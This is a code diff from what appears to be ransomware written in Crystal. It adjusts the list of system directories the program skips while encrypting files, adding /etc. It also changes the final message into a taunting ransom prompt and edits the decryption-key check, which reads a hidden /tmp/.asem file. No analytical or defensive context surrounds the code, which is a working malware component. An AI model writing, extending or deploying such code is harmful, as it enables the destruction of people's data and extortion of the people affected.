@@ -9,8 +9,26 @@ excludes = [] of String
 keypair = {} of String => BigInt
 
 excludes = [
-  "/proc", "/sys", "/dev", "/run", "/bin", "/sbin", "/lib", "/lib64",
-  "/usr", "/boot", "/efi", "/snap", "/var/lib",
+  # "/proc", "/sys", "/dev", "/run", "/bin", "/sbin", "/lib", "/lib64",
+  # "/usr", "/boot", "/efi", "/snap", "/var/lib",
+  "/boot",
+  "/dev",
+  "/lib",
+  "/lost+found",
+  "/proc",
+  "/run",
+  "/sbin",
+  "/srv",
+  "/sys",
+  "/efi",
+  "/snap",
+  "/usr",
+  "/lib",
+  "/lib64",
+  "/bin",
+  "/var/lib",
+  "/etc"
+
 ]
 
 ENV["PATH"].split(":").each do |path|
@@ -37,8 +55,6 @@ File.write(
 
 # Allocate 1/4 of the avaliable memory.
 # By checking for what's avaliable and turns into bytes then divided by 4!
-
-
 
 armed = true
 
@@ -72,8 +88,10 @@ end
 
 
 
-puts("Thank you! #{files.size} files have been encrypted.")
+# puts("Thank you! #{files.size} files have been encrypted.")
 
+puts("Oops.. It seems that #{files.size} have been encrypted! What a shame :/")
+puts("Please insert the decryption key. Will ya?")
 loop do
   print("Decryption key> ")
   key = gets
@@ -84,12 +102,9 @@ loop do
     begin
       k = BigInt.new(Int128.new(parts[0].gsub(/_i128$/, "")))
       p_ = BigInt.new(Int128.new(parts[1].gsub(/_i128$/, "")))
-      
-
-
       if File.exists?("/tmp/.asem")
-        buff = File.read("/tmp/.asem")
         begin
+	        buff = File.read("/tmp/.asem")
           if asem.decrypt(buff, k, p_, false) == testString
             puts("Valid decryption key!")
           else
@@ -114,7 +129,6 @@ loop do
         begin
           out_buffer = File.open("#{original_path}", "wb")
           in_buffer = File.open(path, "rb")
-    
           buffer = Bytes.new(256 * 1024)
           loop do
             bytes = in_buffer.read(buffer)
